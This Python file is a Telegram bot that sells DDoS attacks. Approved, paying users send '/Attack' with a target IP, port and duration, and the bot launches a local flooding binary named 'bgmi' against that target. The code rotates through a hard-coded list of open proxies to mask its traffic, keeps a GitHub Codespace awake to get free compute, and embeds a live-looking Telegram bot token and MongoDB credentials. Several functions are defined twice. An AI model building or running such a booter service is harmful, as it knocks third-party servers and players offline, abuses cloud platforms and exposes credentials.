import os
import telebot
import json
import requests
import logging
import time
from pymongo import MongoClient
from datetime import datetime, timedelta
import certifi
import random
from subprocess import Popen
from threading import Thread
import asyncio
import aiohttp
loop = asyncio.get_event_loop()
TOKEN = '7468132796:AAGqdy8EGOkkfkxmcHR_mPXPL8_aMIfQJAE'
MONGO_URI = 'mongodb+srv://piroop:piroop@piro.hexrg9w.mongodb.net/?retryWrites=true&w=majority&appName=piro&tlsAllowInvalidCertificates=true'
FORWARD_CHANNEL_ID = -1002174005358
CHANNEL_ID = -1002174005358
error_channel_id = -1002174005358
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
client = MongoClient(MONGO_URI, tlsCAFile=certifi.where())
db = client['soul']
users_collection = db.users
bot = telebot.TeleBot(TOKEN)
REQUEST_INTERVAL = 1
async def start_asyncio_thread():
    asyncio.set_event_loop(loop)
    await keep_codespace_active()
    await start_asyncio_loop()

def update_proxy(): 
    proxy_list = ["https://43.134.234.74:443", "https://175.101.18.21:5678", "https://179.189.196.52:5678", "https://162.247.243.29:80", "https://173.244.200.154:44302", "https://173.244.200.156:64631", "https://207.180.236.140:51167", "https://123.145.4.15:53309", "https://36.93.15.53:65445", "https://1.20.207.225:4153", "https://83.136.176.72:4145", "https://115.144.253.12:23928", "https://78.83.242.229:4145", "https://128.14.226.130:60080", "https://194.163.174.206:16128", "https://110.78.149.159:4145", "https://190.15.252.205:3629", "https://101.43.191.233:2080", "https://202.92.5.126:44879", "https://221.211.62.4:1111", "https://58.57.2.46:10800", "https://45.228.147.239:5678", "https://43.157.44.79:443", "https://103.4.118.130:5678", "https://37.131.202.95:33427", "https://172.104.47.98:34503", "https://216.80.120.100:3820", "https://182.93.69.74:5678", "https://8.210.150.195:26666", "https://49.48.47.72:8080", "https://37.75.112.35:4153", "https://8.218.134.238:10802", "https://139.59.128.40:2016", "https://45.196.151.120:5432", "https://24.78.155.155:9090", "https://212.83.137.239:61542", "https://46.173.175.166:10801", "https://103.196.136.158:7497", "https://82.194.133.209:4153", "https://210.4.194.196:80", "https://88.248.2.160:5678", "https://116.199.169.1:4145", "https://77.99.40.240:9090", "https://143.255.176.161:4153", "https://172.99.187.33:4145", "https://43.134.204.249:33126", "https://185.95.227.244:4145", "https://197.234.13.57:4145", "https://81.12.124.86:5678", "https://101.32.62.108:1080", "https://192.169.197.146:55137", "https://82.117.215.98:3629", "https://202.162.212.164:4153", "https://185.105.237.11:3128", "https://123.59.100.247:1080", "https://192.141.236.3:5678", "https://182.253.158.52:5678", "https://164.52.42.2:4145", "https://185.202.7.161:1455", "https://186.236.8.19:4145", "https://36.67.147.222:4153", "https://118.96.94.40:80", "https://27.151.29.27:2080", "https://181.129.198.58:5678", "https://200.105.192.6:5678", "https://103.86.1.255:4145", "https://171.248.215.108:1080", "https://181.198.32.211:4153", "https://188.26.5.254:4145", "https://34.120.231.30:80", "https://103.23.100.1:4145", "https://194.4.50.62:12334", "https://201.251.155.249:5678", "https://37.1.211.58:1080", "https://86.111.144.10:4145", "https://80.78.23.49:1080", "https://154.73.85.1:57932", "https://110.77.196.174:4145", "https://112.78.164.62:5678", "https://103.205.128.81:4145", "https://31.172.66.22:20466", "https://38.127.172.167:46656", "https://84.241.22.125:4145", "https://111.67.197.147:6666", "https://188.243.99.234:1080", "https://167.99.80.74:8080", "https://96.9.88.94:4153", "https://103.47.94.34:1080", "https://186.251.255.141:31337", "https://195.78.100.186:3629", "https://50.235.117.234:39593", "https://51.68.87.173:29212", "https://185.205.249.24:45264", "https://103.79.96.177:4153", "https://185.250.148.110:6178", "https://31.44.82.182:5678", "https://98.162.25.23:4145", "https://103.12.246.41:13494", "https://78.38.108.199:1080", "https://46.105.124.74:7497", "https://123.114.207.105:8118", "https://172.67.0.21:13335", "https://139.59.35.142675"]
    proxy = random.choice(proxy_list) 
    telebot.apihelper.proxy = {'https': proxy} 
    logging.info("Proxy updated successfully.")
@bot.message_handler(commands=['update_proxy']) 
def update_proxy_command(message): 
    chat_id = message.chat.id 
    try: update_proxy() 
    except Exception as e: 
        bot.send_message(chat_id, f"Failed to update proxy: {e}")
async def start_asyncio_loop():
    while True:
        await keep_codespace_active()
        await asyncio.sleep(REQUEST_INTERVAL)
async def keep_codespace_active():
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get('https://ubiquitous-lamp-7vrrqvpjv4443qvg.github.dev/') as response:
                if response.status == 200:
                    logging.info("Codespace is active.")
                else:
                    logging.error(f"Failed to keep Codespace active. Status code: {response.status}")
    except Exception as e:
        logging.error(f"An error occurred: {str(e)}")
async def run_attack_command_async(target_ip, target_port, duration):
    process = await asyncio.create_subprocess_shell(f"./bgmi {target_ip} {target_port} {duration} 200")
    await process.communicate()
def is_user_admin(user_id, chat_id): 
    try: return bot.get_chat_member(chat_id, user_id).status in ['administrator', 'creator'] 
    except: return False
@bot.message_handler(commands=['approve', 'disapprove']) 
def approve_or_disapprove_user(message): 
    user_id, chat_id, is_admin, cmd_parts = message.from_user.id, message.chat.id, is_user_admin(message.from_user.id, CHANNEL_ID), message.text.split() 
    if not is_admin: return bot.send_message(chat_id, "You are not authorized to use this command", parse_mode='Markdown') 
    if len(cmd_parts) < 2: return bot.send_message(chat_id, "Invalid command format. Use /approve <user_id> <plan> <days> or /disapprove <user_id>.") 
    action, user_id, plan, days = cmd_parts[0], int(cmd_parts[1]), int(cmd_parts[2]) if len(cmd_parts) >= 3 else 0, int(cmd_parts[3]) if len(cmd_parts) >= 4 else 0 
    valid_until = (datetime.now() + timedelta(days=days)).date().isoformat() if days > 0 else datetime.now().date().isoformat() 
    msg_text = f"User {user_id} {'approved' if action == '/approve' else 'disapproved and reverted to free'} with plan {plan} for {days} days." 
    users_collection.update_one({"user_id": user_id}, {"$set": {"plan": plan, "valid_until": valid_until, "access_count": 0}}, upsert=True) 
    bot.send_message(chat_id, msg_text) and bot.send_message(CHANNEL_ID, msg_text)
@bot.message_handler(commands=['Attack'])
def attack_command(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    try:
        user_data = users_collection.find_one({"user_id": user_id})
        if not user_data or user_data['plan'] == 0:
            bot.send_message(chat_id, "You are not approved to use this bot. Please contact the administrator.")
            return
        args = message.text.split()[1:]
        if len(args) != 3:
            bot.send_message(chat_id, "Invalid command format. Please use: /Attack target_ip target_port time")
            return
        target_ip, target_port, duration = args
        asyncio.run_coroutine_threadsafe(run_attack_command_async(target_ip, target_port, duration), loop)
        bot.reply_to(message, f"Attack started 💥\n\nHost: {target_ip}\nPort: {target_port}\nTime: {duration}")
    except Exception as e:
        logging.error(f"Error in attack command: {e}")
async def start_asyncio_loop():
    while True:
        await keep_codespace_active()
        await asyncio.sleep(REQUEST_INTERVAL)
def start_asyncio_thread():
    asyncio.set_event_loop(loop)
    loop.run_until_complete(start_asyncio_loop())
if __name__ == "__main__":
    asyncio_thread = Thread(target=start_asyncio_thread, daemon=True)
    asyncio_thread.start() 
    logging.info("Starting Codespace activity keeper and Telegram bot...") 
    while True: 
        try: 
            keep_codespace_active() 
            bot.polling(none_stop=True) 
        except Exception as e: 
            logging.error(f"An error occurred while polling: {e}") 
        logging.info(f"Waiting for {REQUEST_INTERVAL} seconds before the next request...") 
        time.sleep(REQUEST_INTERVAL)







